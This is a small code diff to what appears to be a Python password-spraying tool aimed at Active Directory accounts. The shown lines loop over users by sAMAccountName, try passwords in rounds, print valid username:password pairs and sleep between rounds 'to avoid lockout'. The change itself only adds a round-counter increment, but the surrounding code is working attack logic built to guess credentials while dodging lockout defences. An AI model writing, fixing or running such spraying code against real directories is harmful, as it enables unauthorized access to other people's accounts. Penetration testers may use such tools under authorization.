@@ -315,6 +315,7 @@ def main():
         while tries_per_wait > 0:
             tries_per_wait -= 1
             print(f"[*] Trying password round {i+1}/{max_passwords}")
+            
             for user in filtered_users:
                 username = user['sAMAccountName']
                 if username in found_for_user:
@@ -328,6 +329,7 @@ def main():
                     if success:
                         found_for_user.append(username)
                         print(f"[+] VALID CREDENTIAL FOUND: {username}:{pw}")
+            i += 1
 
         print(f"[*] Sleeping for {dynamic_delay:.2f} seconds to avoid lockout...")
         time.sleep(dynamic_delay)
